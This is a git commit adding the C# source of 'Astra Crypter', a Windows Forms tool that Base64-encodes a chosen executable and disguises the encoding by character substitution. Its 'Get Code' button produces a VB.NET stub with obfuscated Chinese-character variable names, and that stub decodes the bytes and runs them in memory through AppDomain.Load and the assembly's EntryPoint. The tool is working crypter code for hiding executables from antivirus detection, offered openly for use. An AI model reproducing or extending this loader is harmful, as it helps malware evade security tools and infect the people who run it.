fa51f896d471982dd1bdf073efc57e6a87a95f4e
Russian-God <99105531+Russian-God@users.noreply.github.com>
2022-09-04 10:15:13 -0400

    Add files via upload

---
+++ Astra_Crypter/Form1.Designer.cs
@@ -0,0 +1,169 @@
+﻿namespace Astra_Crypter
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.button3 = new System.Windows.Forms.Button();
+            this.button4 = new System.Windows.Forms.Button();
+            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
+            this.button5 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Font = new System.Drawing.Font("Montserrat", 10.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button1.Location = new System.Drawing.Point(299, 12);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(184, 68);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Base 64 Encrypt";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(230, 173);
+            this.textBox1.Multiline = true;
+            this.textBox1.Name = "textBox1";
+            this.textBox1.ReadOnly = true;
+            this.textBox1.Size = new System.Drawing.Size(507, 281);
+            this.textBox1.TabIndex = 1;
+            this.textBox1.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(33, 202);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(168, 16);
+            this.label2.TabIndex = 4;
+            this.label2.Text = "Replace A\'s By Charachter";
+            this.label2.Click += new System.EventHandler(this.label2_Click);
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(36, 221);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(100, 22);
+            this.textBox3.TabIndex = 5;
+            this.textBox3.TextChanged += new System.EventHandler(this.textBox3_TextChanged);
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(36, 250);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 6;
+            this.button2.Text = "Replace";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // button3
+            // 
+            this.button3.Font = new System.Drawing.Font("Montserrat", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button3.Location = new System.Drawing.Point(21, 301);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(138, 67);
+            this.button3.TabIndex = 7;
+            this.button3.Text = "Get Code";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // button4
+            // 
+            this.button4.Font = new System.Drawing.Font("Montserrat", 10.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button4.Location = new System.Drawing.Point(21, 96);
+            this.button4.Name = "button4";
+            this.button4.Size = new System.Drawing.Size(153, 54);
+            this.button4.TabIndex = 8;
+            this.button4.Text = "Browse File";
+            this.button4.UseVisualStyleBackColor = true;
+            this.button4.Click += new System.EventHandler(this.button4_Click);
+            // 
+            // openFileDialog1
+            // 
+            this.openFileDialog1.Filter = ".exe| *.exe|All Files|*.*";
+            this.openFileDialog1.FilterIndex = 2;
+            this.openFileDialog1.Title = "Browse File";
+            this.openFileDialog1.FileOk += new System.ComponentModel.CancelEventHandler(this.openFileDialog1_FileOk);
+            // 
+            // button5
+            // 
+            this.button5.Font = new System.Drawing.Font("Montserrat", 10.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.button5.Location = new System.Drawing.Point(299, 89);
+            this.button5.Name = "button5";
+            this.button5.Size = new System.Drawing.Size(184, 68);
+            this.button5.TabIndex = 9;
+            this.button5.Text = "AES";
+            this.button5.UseVisualStyleBackColor = true;
+            this.button5.Click += new System.EventHandler(this.button5_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.SystemColors.Window;
+            this.ClientSize = new System.Drawing.Size(977, 500);
+            this.Controls.Add(this.button5);
+            this.Controls.Add(this.button4);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.button1);
+            this.ForeColor = System.Drawing.Color.Red;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.Fixed3D;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.Text = "Astra Crypter";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button4;
+        private System.Windows.Forms.OpenFileDialog openFileDialog1;
+        private System.Windows.Forms.Button button5;
+    }
+}
+
---
+++ Astra_Crypter/Form1.cs
@@ -0,0 +1,123 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+
+namespace Astra_Crypter
+{
+    public partial class Form1 : Form
+    {
+        string chara = "A";
+        string filename = "";
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void textBox2_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+        
+        private void textBox1_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (filename == "")
+            {
+                var result = MessageBox.Show("WARNING" + Environment.NewLine + "You did not select any file.", "WARNING", MessageBoxButtons.RetryCancel);
+                if (result == DialogResult.Retry)
+                {
+                    openFileDialog1.ShowDialog();
+                }
+
+
+            }
+
+            byte[] buffer = File.ReadAllBytes(filename);
+            var plaintext = Convert.ToBase64String(buffer);
+            textBox1.Text = plaintext;
+
+        }
+
+        private void label2_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            chara = textBox3.Text;
+            string newtext = textBox1.Text.Replace("A", chara);
+            textBox1.Text = newtext;
+        }
+
+        private void textBox3_TextChanged(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+            
+            string base64 = textBox1.Text;
+            string thi =
+
+                
+                "Module module1" + Environment.NewLine +
+                "Sub Main()" + Environment.NewLine +
+                "Dim 饕餮饕餮 As String = \"" + base64 + "\"" + Environment.NewLine +
+                "Dim 饕餮饕餮饕餮 As String = Replace(饕餮饕餮, \"" + chara + "\", \"A\")" + Environment.NewLine +
+                "Dim 饕餮饕餮饕餮饕餮() As Byte = Convert.FromBase64String(饕餮饕餮饕餮)" + Environment.NewLine +
+
+                "CallByName(AppDomain.CurrentDomain.Load(饕餮饕餮饕餮饕餮).EntryPoint, \"Invoke\", CallType.Method, \"\", Nothing)" + Environment.NewLine +
+                "End Sub" + Environment.NewLine + 
+                "End Module";
+                
+                
+            textBox1.Text = thi;
+            
+
+
+
+
+        }
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+
+            openFileDialog1.ShowDialog();
+            if (filename != "")
+            {
+                
+                MessageBox.Show(filename + " Loaded", "Successfull", MessageBoxButtons.OK);
+            }
+            
+
+        }
+
+        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
+        {
+            filename = openFileDialog1.FileName;
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+            
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
